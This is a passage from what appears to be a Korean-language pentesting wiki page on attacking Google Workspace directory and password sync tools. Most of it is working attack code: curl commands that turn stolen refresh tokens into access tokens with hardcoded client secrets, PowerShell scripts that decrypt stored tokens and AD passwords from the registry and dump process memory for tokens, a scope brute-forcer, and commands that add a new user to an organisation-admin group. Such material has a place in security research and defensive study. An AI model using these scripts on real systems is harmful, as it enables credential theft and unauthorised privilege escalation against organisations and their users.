https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

다음은 이러한 범위를 사용하는 몇 가지 예입니다:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault**는 Gmail, Drive, Chat 등 Google Workspace 서비스에 저장된 조직의 데이터를 위한 데이터 보존, 검색 및 내보내기 도구를 제공하는 Google Workspace의 추가 기능입니다.

* Google Workspace Vault의 **Matter**는 특정 사건, 조사 또는 법적 문제와 관련된 모든 정보를 조직하고 그룹화하는 **컨테이너**입니다. 이는 해당 문제와 관련된 **Holds**, **Searches**, 및 **Exports**를 관리하는 중앙 허브 역할을 합니다.
* Google Workspace Vault의 **Hold**는 특정 사용자 또는 그룹에 적용되어 Google Workspace 서비스 내에서 데이터의 **삭제 또는 변경을 방지하는** **보존 조치**입니다. Holds는 관련 정보가 법적 사건이나 조사 기간 동안 손상되지 않고 수정되지 않도록 보장합니다.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
더 많은 [API 엔드포인트는 문서에서 확인하세요](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

이 도구는 **활성 디렉토리 사용자 및 그룹을 Workspace에 동기화하는 데 사용될 수 있습니다** (이 글을 작성할 당시에는 그 반대는 아닙니다).

흥미로운 점은 **Workspace 슈퍼유저 및 권한이 있는 AD 사용자**의 **자격 증명**이 필요하다는 것입니다. 따라서 사용자 동기화를 주기적으로 수행하는 도메인 서버 내에서 이를 찾는 것이 가능할 수 있습니다.

{% hint style="info" %}
**`config-manager.exe`** 바이너리에 대해 **MitM**을 수행하려면 `config.manager.vmoptions` 파일에 다음 줄을 추가하세요: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)가 **GCDS**를 감지하고, 구성에 대한 정보를 얻으며 **심지어 비밀번호와 암호화된 자격 증명**도 확인할 수 있다는 점에 유의하세요.
{% endhint %}

또한 GCDS는 AD에서 Workspace로 비밀번호를 동기화하지 않습니다. 오히려 Workspace에서 새로 생성된 사용자에 대해 무작위 비밀번호를 생성할 뿐입니다. 다음 이미지에서 확인할 수 있습니다:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - 디스크 토큰 및 AD 자격 증명

바이너리 `config-manager.exe` (GUI가 있는 주요 GCDS 바이너리)는 기본적으로 **`C:\Program Files\Google Cloud Directory Sync`** 폴더의 **`Untitled-1.xml`** 파일에 구성된 Active Directory 자격 증명, 새로 고침 토큰 및 액세스를 저장합니다. 그러나 사용자 `Documents` 또는 **다른 폴더**에 저장될 수도 있습니다.

게다가 레지스트리 **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`**의 **`open.recent`** 키 안에는 최근에 열린 모든 구성 파일(xml)의 경로가 포함되어 있습니다. 따라서 **이를 확인하여 찾을 수 있습니다**.

파일 내에서 가장 흥미로운 정보는 다음과 같습니다:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
사용자의 **refresh** **token**과 **password**는 **AES CBC**를 사용하여 무작위로 생성된 키와 IV로 **암호화**되며, **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`**에 저장됩니다 (여기서 **`prefs`** Java 라이브러리는 기본 설정을 저장합니다). 문자열 키 **`/Encryption/Policy/V2.iv`**와 **`/Encryption/Policy/V2.key`**에 base64로 저장됩니다.

<details>

<summary>refresh token과 password를 복호화하는 Powershell 스크립트</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
이 정보를 확인하는 방법은 **`C:\Program Files\Google Cloud Directory Sync`**의 **`DirSync.jar`** 자바 코드를 확인하고 `exportkeys` 문자열을 검색하는 것입니다 (이는 바이너리 `upgrade-config.exe`가 키를 덤프하기 위해 기대하는 CLI 매개변수입니다).
{% endhint %}

powershell 스크립트를 사용하는 대신, 매개변수 `-exportKeys`와 함께 바이너리 **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`**를 사용하여 레지스트리에서 **Key**와 **IV**를 헥사로 가져온 다음, AES/CBC와 해당 키 및 IV를 사용하여 정보를 복호화할 수 있습니다.

### GCDS - 메모리에서 토큰 덤프하기

GCPW와 마찬가지로, `config-manager.exe` 프로세스의 메모리를 덤프할 수 있으며 (이것은 GCDS의 GUI가 있는 주요 바이너리의 이름입니다) 이미 생성된 경우 새로 고침 및 액세스 토큰을 찾을 수 있습니다.\
AD에 구성된 자격 증명도 찾을 수 있을 것입니다.

<details>

<summary>config-manager.exe 프로세스 덤프 및 토큰 검색</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - 리프레시 토큰에서 액세스 토큰 생성

리프레시 토큰을 사용하여 다음 명령에 지정된 클라이언트 ID와 클라이언트 비밀을 사용하여 액세스 토큰을 생성할 수 있습니다:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
리프레시 토큰이 있더라도, 액세스 토큰을 위해 요청할 수 있는 스코프는 **액세스 토큰을 생성하는 애플리케이션에서 지원하는 스코프**만 요청할 수 있습니다.

또한, 리프레시 토큰은 모든 애플리케이션에서 유효하지 않습니다.
{% endhint %}

기본적으로 GCSD는 사용자의 모든 가능한 OAuth 스코프에 접근할 수 없으므로, 다음 스크립트를 사용하여 `refresh_token`으로 `access_token`을 생성하는 데 사용할 수 있는 스코프를 찾을 수 있습니다:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

그리고 이것은 제가 작성 당시 받은 출력입니다:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### 사용자 생성 및 `gcp-organization-admins` 그룹에 추가하여 GCP에서 권한 상승 시도
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
새 사용자에게 Super Admin 역할을 부여할 수 없습니다. **리프레시 토큰에 필요한 범위가 충분하지 않기 때문입니다.**
{% endhint %}

## 관리 디렉토리 동기화

GCDS와 사용자를 동기화하는 이 방법의 주요 차이점은 GCDS가 다운로드하여 실행해야 하는 일부 바이너리로 수동으로 수행되는 반면, **관리 디렉토리 동기화는 서버리스**로 Google이 관리합니다 [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

이 글을 작성하는 시점에서 이 서비스는 베타 상태이며 두 가지 유형의 동기화를 지원합니다: **Active Directory**와 **Azure Entra ID**에서:

* **Active Directory:** 이를 설정하려면 **Google에 Active Directory 환경에 대한 액세스를 제공해야 합니다**. Google은 GCP 네트워크( **VPC 커넥터**를 통해)만 액세스할 수 있으므로 커넥터를 생성한 다음 GCP 네트워크의 VM에 있거나 Cloud VPN 또는 Cloud Interconnect를 사용하여 해당 커넥터에서 AD를 사용할 수 있도록 해야 합니다. 그런 다음 **디렉토리에 대한 읽기 액세스 권한이 있는 계정의 자격 증명**과 **LDAPS**를 통해 연락하기 위한 **인증서**를 제공해야 합니다.
* **Azure Entra ID:** 이를 구성하려면 **Google이 표시하는 팝업에서 Entra ID 구독에 대한 읽기 액세스 권한이 있는 사용자로 Azure에 로그인**하기만 하면 되며, Google은 Entra ID에 대한 읽기 액세스 권한이 있는 토큰을 유지합니다.

올바르게 구성되면 두 옵션 모두 **Workspace에 사용자 및 그룹을 동기화할 수 있지만**, Workspace에서 AD 또는 EntraID로 사용자 및 그룹을 구성할 수는 없습니다.

이 동기화 중에 허용되는 다른 옵션은 다음과 같습니다:

* 새 사용자에게 로그인하라는 이메일 전송
* Workspace에서 사용하는 이메일 주소로 자동으로 변경. 따라서 Workspace가 `@hacktricks.xyz`를 사용하고 EntraID 사용자가 `@carloshacktricks.onmicrosoft.com`을 사용하는 경우, `@hacktricks.xyz`가 계정에 생성된 사용자에게 사용됩니다.
* 동기화할 **사용자가 포함된 그룹 선택**.
* Workspace에서 동기화하고 생성할 **그룹 선택**(또는 모든 그룹을 동기화하도록 지정).

### AD/EntraID -> Google Workspace

AD 또는 EntraID를 손상시키면 Google Workspace와 동기화될 사용자 및 그룹을 완전히 제어할 수 있습니다.\
그러나 사용자가 Workspace에서 사용할 수 있는 **비밀번호**는 **같을 수도 있고 아닐 수도 있습니다**.

#### 사용자 공격

동기화가 발생하면 **AD의 모든 사용자 또는 특정 OU의 사용자만 동기화되거나 EntraID의 특정 그룹의 사용자만 동기화될 수 있습니다**. 이는 동기화된 사용자(또는 동기화되는 새 사용자)를 공격하려면 먼저 어떤 사용자가 동기화되고 있는지 파악해야 함을 의미합니다.

* 사용자는 **AD 또는 EntraID에서 비밀번호를 재사용할 수도 있고 아닐 수도 있지만**, 이는 **로그인하기 위해 사용자의 비밀번호를 손상시켜야 함을 의미합니다**.
* 사용자의 **이메일**에 액세스할 수 있는 경우, **기존 사용자의 Workspace 비밀번호를 변경**하거나 **새 사용자를 생성**하고, 동기화될 때까지 기다렸다가 계정을 설정할 수 있습니다.

Workspace 내에서 사용자에 액세스하면 기본적으로 일부 **권한이 부여될 수 있습니다**.

#### 그룹 공격

어떤 그룹이 동기화되고 있는지 먼저 파악해야 합니다. **모든** 그룹이 동기화되고 있을 가능성도 있습니다(Workspace가 이를 허용하므로).

{% hint style="info" %}
그룹 및 구성원이 Workspace로 가져와지더라도, **사용자 동기화에서 동기화되지 않은 사용자는 그룹 동기화 중에 생성되지 않습니다**. 비록 그들이 동기화된 그룹의 구성원일지라도 말입니다.
{% endhint %}

Azure에서 **Workspace 또는 GCP에 권한이 부여된 그룹**을 알고 있다면, 손상된 사용자(또는 새로 생성된 사용자)를 해당 그룹에 추가하고 그 권한을 얻을 수 있습니다.

Workspace에서 기존의 특권 그룹을 악용할 수 있는 또 다른 옵션이 있습니다. 예를 들어, 그룹 `gcp-organization-admins@<workspace.email>`은 일반적으로 GCP에 대한 높은 권한을 가지고 있습니다.

예를 들어 EntraID에서 Workspace로의 동기화가 **가져온 객체의 도메인을 Workspace의 이메일로 교체하도록 구성된 경우**, 공격자가 EntraID에서 `gcp-organization-admins@<entraid.email>` 그룹을 생성하고 이 그룹에 사용자를 추가한 다음 모든 그룹의 동기화가 발생할 때까지 기다릴 수 있습니다.\
**사용자는 `gcp-organization-admins@<workspace.email>` 그룹에 추가되어 GCP에서 권한이 상승합니다.**

### Google Workspace -> AD/EntraID

Workspace는 사용자 및 그룹을 동기화하기 위해 AD 또는 EntraID에 대한 읽기 전용 액세스 권한이 있는 자격 증명을 요구합니다. 따라서 Google Workspace를 악용하여 AD 또는 EntraID에서 변경을 수행하는 것은 불가능합니다. 따라서 **현재로서는 불가능합니다**.

Google이 AD 자격 증명이나 EntraID 토큰을 어디에 저장하는지 모르며, **동기화를 재구성하여 복구할 수 없습니다**(웹 양식에 나타나지 않으며, 다시 제공해야 합니다). 그러나 웹에서 현재 기능을 악용하여 **사용자 및 그룹 목록을 나열할 수 있을지도 모릅니다**.

## GPS - Google 비밀번호 동기화

이것은 Google이 **AD와 Workspace 간의 사용자 비밀번호를 동기화하기 위해 제공하는 바이너리 및 서비스**입니다. 사용자가 AD에서 비밀번호를 변경할 때마다 Google에 설정됩니다.

`C:\Program Files\Google\Password Sync`에 설치되며, 여기에서 구성할 수 있는 바이너리 `PasswordSync.exe`와 계속 실행될 서비스인 `password_sync_service.exe`를 찾을 수 있습니다.

### GPS - 구성

이 바이너리(및 서비스)를 구성하려면 **Workspace에서 Super Admin 주체에 대한 액세스를 제공해야 합니다**:

* Google을 통해 **OAuth**로 로그인한 후 **레지스트리에 토큰을 저장합니다(암호화됨)**
* GUI가 있는 도메인 컨트롤러에서만 사용 가능
* **Workspace 사용자 관리** 권한이 있는 **GCP의 서비스 계정 자격 증명**(json 파일) 제공
* 이러한 자격 증명은 만료되지 않으며 악용될 수 있으므로 매우 나쁜 아이디어
* 서비스 계정이 Workspace에 대한 액세스를 갖는 것은 매우 나쁜 아이디어입니다. 서비스 계정이 GCP에서 손상되면 Workspace로 피벗할 수 있습니다.
* Google은 GUI가 없는 도메인 제어를 위해 이를 요구합니다.
* 이러한 자격 증명도 레지스트리에 저장됩니다.

AD와 관련하여 현재 **응용 프로그램 컨텍스트, 익명 또는 특정 자격 증명**을 사용할 수 있도록 지정할 수 있습니다. 자격 증명 옵션이 선택되면 **사용자 이름**은 **디스크**의 파일에 저장되고 **비밀번호**는 **암호화되어** **레지스트리**에 저장됩니다.

### GPS - 디스크에서 비밀번호 및 토큰 덤프

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)가 **GPS**를 감지하고 구성에 대한 정보를 얻으며 **비밀번호와 토큰을 복호화**할 수 있습니다.
{% endhint %}

**`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** 파일에서 구성의 일부를 찾을 수 있으며, 여기에는 구성된 AD의 **`baseDN`**과 사용 중인 **`username`**이 포함됩니다.

레지스트리 **`HKLM\Software\Google\Google Apps Password Sync`**에서 **암호화된 리프레시 토큰**과 **AD 사용자에 대한 암호**(있는 경우)를 찾을 수 있습니다. 또한, 토큰 대신 **SA 자격 증명**이 사용된 경우, 해당 레지스트리 주소에서 암호화된 자격 증명을 찾을 수 있습니다. 이 레지스트리 내의 **값**은 **관리자**만 **액세스할 수 있습니다**.

암호화된 **비밀번호**(있는 경우)는 **`ADPassword`** 키 내에 있으며, **`CryptProtectData`** API를 사용하여 암호화됩니다. 이를 복호화하려면 비밀번호 동기화를 구성한 사용자와 동일한 사용자여야 하며, **`CryptUnprotectData`**를 사용할 때 이 **엔트로피**를 사용해야 합니다: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

암호화된 토큰(있는 경우)은 **`AuthToken`** 키 내에 있으며, **`CryptProtectData`** API를 사용하여 암호화됩니다. 이를 복호화하려면 비밀번호 동기화를 구성한 사용자와 동일한 사용자여야 하며, **`CryptUnprotectData`**를 사용할 때 이 **엔트로피**를 사용해야 합니다: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
또한, **`0123456789abcdefghijklmnopqrstv`** 사전을 사용하여 base32hex로 인코딩됩니다.

엔트로피 값은 도구를 사용하여 발견되었습니다. 이 도구는 **`CryptUnprotectData`** 및 **`CryptProtectData`** 호출을 모니터링하도록 구성되었으며, 그런 다음 `PasswordSync.exe`를 실행하고 모니터링하는 데 사용되었습니다. 이 도구는 구성된 비밀번호와 인증 토큰을 처음에 복호화하고, 두 경우 모두 **사용된 엔트로피의 값을 보여줍니다**:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

